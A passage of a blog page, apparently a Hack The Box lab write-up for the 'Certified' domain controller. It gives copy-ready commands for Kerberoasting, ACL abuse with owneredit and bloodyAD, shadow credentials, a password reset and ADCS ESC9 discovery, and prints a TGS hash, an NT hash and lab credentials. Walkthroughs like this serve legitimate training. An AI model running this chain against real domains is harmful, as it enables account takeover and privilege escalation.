@@ -1,0 +1,1079 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="ip: 10.10.11.41 Initial Creds: judith.mader / judith09 Port Scan 1 2 3 4 5 6 7 8 9 10 11 12 PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPss hostname: dc01.certified.htb User Enumeration Kerberoasting We can try kerberoaating to obtain hashes that we can crack using hashcat.">
+<title>Htb_certified</title>
+
+<link rel='canonical' href='http://localhost:1313/p/htb_certified/'>
+
+<link rel="stylesheet" href="/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css"><meta property='og:title' content="Htb_certified">
+<meta property='og:description' content="ip: 10.10.11.41 Initial Creds: judith.mader / judith09 Port Scan 1 2 3 4 5 6 7 8 9 10 11 12 PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPss hostname: dc01.certified.htb User Enumeration Kerberoasting We can try kerberoaating to obtain hashes that we can crack using hashcat.">
+<meta property='og:url' content='http://localhost:1313/p/htb_certified/'>
+<meta property='og:site_name' content='f0rk3b0mb'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-11-28T17:13:33&#43;03:00'/><meta property='article:modified_time' content='2024-11-28T17:13:33&#43;03:00'/>
+<meta name="twitter:site" content="@f0rk3b0mb">
+    <meta name="twitter:creator" content="@f0rk3b0mb"><meta name="twitter:title" content="Htb_certified">
+<meta name="twitter:description" content="ip: 10.10.11.41 Initial Creds: judith.mader / judith09 Port Scan 1 2 3 4 5 6 7 8 9 10 11 12 PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPss hostname: dc01.certified.htb User Enumeration Kerberoasting We can try kerberoaating to obtain hashes that we can crack using hashcat.">
+  
+    
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-45FL0WGH80"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-45FL0WGH80');
+        }
+      </script>
+    
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/profile_hu9b359325930a7af80b3fcd9ff46fff03_13993_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😎</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">f0rk3b0mb</a></h1>
+            <h2 class="site-description">Ctf player p3rf3ctr00t_ke | Cybersecurity | Infosec | web_security_analyst</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/f0rk3b0mb'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg width="2500" height="2432" viewBox="0 0 256 249" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMinYMin meet"><g fill="#161614"><path d="M127.505 0C57.095 0 0 57.085 0 127.505c0 56.336 36.534 104.13 87.196 120.99 6.372 1.18 8.712-2.766 8.712-6.134 0-3.04-.119-13.085-.173-23.739-35.473 7.713-42.958-15.044-42.958-15.044-5.8-14.738-14.157-18.656-14.157-18.656-11.568-7.914.872-7.752.872-7.752 12.804.9 19.546 13.14 19.546 13.14 11.372 19.493 29.828 13.857 37.104 10.6 1.144-8.242 4.449-13.866 8.095-17.05-28.32-3.225-58.092-14.158-58.092-63.014 0-13.92 4.981-25.295 13.138-34.224-1.324-3.212-5.688-16.18 1.235-33.743 0 0 10.707-3.427 35.073 13.07 10.17-2.826 21.078-4.242 31.914-4.29 10.836.048 21.752 1.464 31.942 4.29 24.337-16.497 35.029-13.07 35.029-13.07 6.94 17.563 2.574 30.531 1.25 33.743 8.175 8.929 13.122 20.303 13.122 34.224 0 48.972-29.828 59.756-58.22 62.912 4.573 3.957 8.648 11.717 8.648 23.612 0 17.06-.148 30.791-.148 34.991 0 3.393 2.295 7.369 8.759 6.117 50.634-16.879 87.122-64.656 87.122-120.973C255.009 57.085 197.922 0 127.505 0"/><path d="M47.755 181.634c-.28.633-1.278.823-2.185.389-.925-.416-1.445-1.28-1.145-1.916.275-.652 1.273-.834 2.196-.396.927.415 1.455 1.287 1.134 1.923M54.027 187.23c-.608.564-1.797.302-2.604-.589-.834-.889-.99-2.077-.373-2.65.627-.563 1.78-.3 2.616.59.834.899.996 2.08.36 2.65M58.33 194.39c-.782.543-2.06.034-2.849-1.1-.781-1.133-.781-2.493.017-3.038.792-.545 2.05-.055 2.85 1.07.78 1.153.78 2.513-.019 3.069M65.606 202.683c-.699.77-2.187.564-3.277-.488-1.114-1.028-1.425-2.487-.724-3.258.707-.772 2.204-.555 3.302.488 1.107 1.026 1.445 2.496.7 3.258M75.01 205.483c-.307.998-1.741 1.452-3.185 1.028-1.442-.437-2.386-1.607-2.095-2.616.3-1.005 1.74-1.478 3.195-1.024 1.44.435 2.386 1.596 2.086 2.612M85.714 206.67c.036 1.052-1.189 1.924-2.705 1.943-1.525.033-2.758-.818-2.774-1.852 0-1.062 1.197-1.926 2.721-1.951 1.516-.03 2.758.815 2.758 1.86M96.228 206.267c.182 1.026-.872 2.08-2.377 2.36-1.48.27-2.85-.363-3.039-1.38-.184-1.052.89-2.105 2.367-2.378 1.508-.262 2.857.355 3.049 1.398"/></g></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://ke.linkedin.com/in/abel-biketi-261212257'
+                        target="_blank"
+                        title="linkedin"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg height="2500" width="2490" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256"><g fill="none"><path d="M0 18.338C0 8.216 8.474 0 18.92 0h218.16C247.53 0 256 8.216 256 18.338v219.327C256 247.79 247.53 256 237.08 256H18.92C8.475 256 0 247.791 0 237.668V18.335z" fill="#069"/><path d="M77.796 214.238V98.986H39.488v115.252H77.8zM58.65 83.253c13.356 0 21.671-8.85 21.671-19.91-.25-11.312-8.315-19.915-21.417-19.915-13.111 0-21.674 8.603-21.674 19.914 0 11.06 8.312 19.91 21.169 19.91h.248zM99 214.238h38.305v-64.355c0-3.44.25-6.889 1.262-9.346 2.768-6.885 9.071-14.012 19.656-14.012 13.858 0 19.405 10.568 19.405 26.063v61.65h38.304v-66.082c0-35.399-18.896-51.872-44.099-51.872-20.663 0-29.738 11.549-34.78 19.415h.255V98.99H99.002c.5 10.812-.003 115.252-.003 115.252z" fill="#fff"/></g></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/f0rk3b0mb'
+                        target="_blank"
+                        title="twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg clip-rule="evenodd" fill-rule="evenodd" height="1684" stroke-linejoin="round" stroke-miterlimit="2" viewBox="-89.00934757 -46.8841404 643.93723344 446.8841404" width="2500" xmlns="http://www.w3.org/2000/svg"><path d="m154.729 400c185.669 0 287.205-153.876 287.205-287.312 0-4.37-.089-8.72-.286-13.052a205.304 205.304 0 0 0 50.352-52.29c-18.087 8.044-37.55 13.458-57.968 15.899 20.841-12.501 36.84-32.278 44.389-55.852a202.42 202.42 0 0 1 -64.098 24.511c-18.42-19.628-44.644-31.904-73.682-31.904-55.744 0-100.948 45.222-100.948 100.965 0 7.925.887 15.631 2.619 23.025-83.895-4.223-158.287-44.405-208.074-105.504a100.739 100.739 0 0 0 -13.668 50.754c0 35.034 17.82 65.961 44.92 84.055a100.172 100.172 0 0 1 -45.716-12.63c-.015.424-.015.837-.015 1.29 0 48.903 34.794 89.734 80.982 98.986a101.036 101.036 0 0 1 -26.617 3.553c-6.493 0-12.821-.639-18.971-1.82 12.851 40.122 50.115 69.319 94.296 70.135-34.549 27.089-78.07 43.224-125.371 43.224a204.9 204.9 0 0 1 -24.078-1.399c44.674 28.645 97.72 45.359 154.734 45.359" fill="#1da1f2" fill-rule="nonzero"/></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/posts' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="5" cy="19" r="1" />
+  <path d="M4 4a16 16 0 0 1 16 16" />
+  <path d="M4 11a9 9 0 0 1 9 9" />
+</svg>
+
+
+
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about' target="_blank">
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#port-scan">Port Scan</a></li>
+        <li><a href="#user-enumeration">User Enumeration</a></li>
+        <li><a href="#kerberoasting">Kerberoasting</a></li>
+        <li><a href="#bloodhound">Bloodhound</a></li>
+        <li><a href="#acds">ACDS</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb-boxes/" >
+                Htb Boxes
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/htb_certified/">Htb_certified</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 28, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    5 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>ip: 10.10.11.41</p>
+<p>Initial Creds:  judith.mader / judith09</p>
+<hr>
+<h3 id="port-scan">Port Scan
+</h3><p><img src="https://media.discordapp.net/attachments/1302398138635649175/1302399563826728960/Screenshot_2024-11-02_18_25_44.png?ex=674997dd&amp;is=6748465d&amp;hm=59dbdcb6e8efd97e88837cff53dde22e53268974c4cc55f8f6991200e73fd1c1&amp;=&amp;format=webp&amp;quality=lossless&amp;width=543&amp;height=489"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">53/tcp   open  domain
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds
+</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5
+</span></span><span class="line"><span class="cl">593/tcp  open  http-rpc-epmap
+</span></span><span class="line"><span class="cl">636/tcp  open  ldapssl
+</span></span><span class="line"><span class="cl">3268/tcp open  globalcatLDAP
+</span></span><span class="line"><span class="cl">3269/tcp open  globalcatLDAPss
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>hostname: dc01.certified.htb</p>
+<h3 id="user-enumeration">User Enumeration
+</h3><p><img src="https://media.discordapp.net/attachments/1302398138635649175/1302401345055100948/image.png?ex=67499986&amp;is=67484806&amp;hm=94360957f3ba1ac3ddf260d3540b79f783d739976322fd419a95618a6aa8e2ac&amp;=&amp;format=webp&amp;quality=lossless&amp;width=550&amp;height=240"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="https://media.discordapp.net/attachments/1302398138635649175/1302402135551508510/image.png?ex=67499a42&amp;is=674848c2&amp;hm=deddea29aa9126ec17350394103f930b53b1947ec054796bd0cdfaf629ccbeb7&amp;=&amp;format=webp&amp;quality=lossless&amp;width=550&amp;height=143"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h3 id="kerberoasting">Kerberoasting
+</h3><p>We can try kerberoaating to obtain hashes that we can crack using hashcat. Unfortunately  this hash for user management_svc is not cracklable.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">impacket-GetUserSPNs -dc-ip 10.10.11.42 certified.htb/judith.mader:judith09
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$0942cc8d798a07f94d23f3d40f31c101$776c8d324e7e666f23dda53b33fec0cade021b6ee151eaa16879a340e22c48243d2802418c63da7fb897e2dac062e6ccc07a01f7162e67dbede725aba2351d3d4f0b691b8b1cba209c19e1ac523c749b023a9c846e60ea7fcfe2e598a8d598bddf3bdcdeaa70b9c3205ce472dccc57cf7dfa3f7a2cf83f607021f411a57ca5ec59152863314f2891cf438f34765df4ceec7660ba437714775981d7997cbf1f9d941e3afd0bfbe4be12227fd4b269a46c327a976d03806cd7dea9e9d538b9a99bd2400f829fd070e22945c1a1e3e3f822026d7506044ab68feea8e76077f95c30a273a13d15afa89c81e8659a20e4563f4ce215f44bfb745251401a55a443506e2f97c324baaa8580d03cdd7212bc764dfe4985d450533c08676620ebbbb3fce9bde8975142d1c58ac10bd87c38dd9b730fdfe28ffd63fd978f5e87f019c966b46c713c01754df8a51ef34ef47b178f78f52d64dca524cec57fbb2b77da9dd356c1307341b78d9f91d91a988fefcef49f7ded58e5fd77e23bf90d5957da0696c8b6ccb53e8dda629fe297e3447754b544ed2dea02d6f11ff8510deff0f9820ba033ae0f42deb640dd4a6f0cafd220a40001017d51eb74a8403dd53650d23e89798c05b0d1b918be1cfb5896f29890986af5d3e49d1ded510e3eb50b30fb6c7279374c2a0215a68b582a2cf45fd29025450c7a314f58907499ee5ac3eae981e3afd3bcf702602001f959a5fa1fc9109af00a33ba165cdfec907a5aa50b46e08e81c9f8bedc1783b3a20a02700e10b3056a09454738348e3a858b6aacca78e5a499499651e74682043d6bffc916074ff8133b052ffe9bd7fba76f10168ba85e4b05a3cf889634252d592bd524816a7ccc9ca8b0a78ecfb7f102af2b5915ccbab1555da29e1541e31989b156b6884ad5388f40523c5cca3be7e9ee8a9777acffeac23ca7a8edd1e095491a20c20b907220c96abe27ac5b67f478ced480650c06addeb87a94094727aae1692333f0171c8c8ae6b01cf549b437028a19742243004ecd104d18144243d71c5f1505d535db25a29f6e3205cc1fdec6d78adfe20ee8c2de20ed0d46fe0d2c470e06c77b9f7b2b7d8f863f8f2bfc68aae61d4dcb3eeceb3c2dd7c5c700eecf1015df7677678605aecdefe4657f7f5fd6df0f165e6ac573d8407b63e76e8c90c8168c0ecc9327a4c6cee0b901c9e7857595d6936d1aba6cfb55e947f61bed67d5c2a98eeb0ffc058c60d1d097065508e490653f22fddddd9d56b2434a7a74dd8b0a0be580a64b771a29f37da20f964d03beb53e1de660d4910d560dc1cf9d267e4877b0a91a7afeb0b594629c973c08f4022e62aafd06cf72db68f411f19c029193e6cc302b96ce47264156969e819fb9c3c33749d7fc92f4f2d92a7ae1f0f194594e6e6fe13b28cd424dca74d31684b4bd7b13162fc878e4bb4e9a8df13240124bad0341c7030bc647b8534cf98046f5607f9ecc4336c7533fa9759f09b86653ee75c9d1e439c931899f0eee4b6d4f5aede0df9bdc6528ac9c172b72a49672d503b2117e1c7e7f1e1a141f618a1644e179a
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="bloodhound">Bloodhound
+</h3><p>From bloodhound we can see that there is not direct route from our current user judith.mader to administrator.</p>
+<p><img src="https://media.discordapp.net/attachments/1302398138635649175/1302404370377474119/image.png?ex=67499c57&amp;is=67484ad7&amp;hm=3e12d53088cc557c1d61f045799a9061dc98b1689ae8a9be85d30e4de186167c&amp;=&amp;format=webp&amp;quality=lossless&amp;width=768&amp;height=489"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>But user judith.mader has WriteOwner  privilledges on the OU Management. This enables user judith to change the owner of the OU. This can be done by using tthe impacket-owneredit.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 owneredit.py &#39;certified.htb&#39;/&#39;judith.mader&#39;:&#39;judith09&#39; -action write -new-owner &#39;judith.mader&#39;  -target-dn &#39;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB&#39; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From here we give user judith genericAll privs on the group. So she has full control of the group.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bloodyAD --host &#34;10.10.11.41&#34; -d &#34;certified.htb&#34; -u &#34;judith.mader&#34; -p &#34;judith09&#34; add genericAll Management judith.mader
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can then add user judith to Management OU</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bloodyAD --host &#34;10.10.11.41&#34; -d &#34;certified.htb&#34; -u &#34;judith.mader&#34; -p &#34;judith09&#34; add groupMember &#34;Management&#34; &#34;judith.mader&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Since the group management has genericAll on user management_svc . We can:</p>
+<ul>
+<li>perform targeted Kerberoasting  &raquo; this will lead to the  hash as we got in the initial kerberoast , so we cant crack it.</li>
+<li>use shadow credentials</li>
+</ul>
+<p><img src="https://media.discordapp.net/attachments/1302398138635649175/1302506358666690560/SPOILER_image.png?ex=67495293&amp;is=67480113&amp;hm=0f2d8c8331161c23d55e3152abec5d795f7c6fccd378406469df0f97ea2648ce&amp;=&amp;format=webp&amp;quality=lossless&amp;width=550&amp;height=284"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Check the following reference <a class="link" href="https://i-tracing.com/blog/shadow-credentials/"  target="_blank" rel="noopener"
+    >ref</a></p>
+<p>For shadow creds we can choose to use:</p>
+<ul>
+<li>&ldquo;pywhisker&rdquo;</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 pywhisker.py -d certified.htb -u judith.mader -p judith09 --target management_svc --action add
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>&ldquo;certipy&rdquo;</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">certipy-ad shadow auto -u &#34;judith.mader&#34;@&#34;certified.htb&#34; -p &#34;judith09&#34; -account &#34;management_svc&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From this we can obtain the ntlm hash for user management_svc. We can now login via winrm.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a091c1832bcdd4677c28b5a6a1295584
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>user.txt :)</p>
+<hr>
+<h3 id="acds">ACDS
+</h3><p>From bloodhound you can see that user management_svc has genericWrite on user ca_operator. So we can chage the password. You can also use the shadow creds technique to get the nthash instead.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bloodyAD --host &#34;10.10.11.41&#34; -d &#34;certified.htb&#34; -u &#34;management_svc&#34; -p &#34;a091c1832bcdd4677c28b5a6a1295584:a091c1832bcdd4677c28b5a6a1295584&#34; set password &#34;ca_operator&#34; &#39;p@ssw0rd!&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As per the name of this machine , you should obviously guess that we need to exploit ADCS.</p>
+<p>Use the following command to find vulnerable certs.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">certipy-ad find -u ca_operator@certified.htb -p &#39;p@ssw0rd!&#39; -dc-ip 10.10.11.41 -stdout -vulnerable
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see that we have ESC9 certificate that is misconfigured.  You can read more on this topic &raquo; <a class="link" href="https://github.com/ly4k/Certipy"  target="_blank" rel="noopener"
+    >here</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
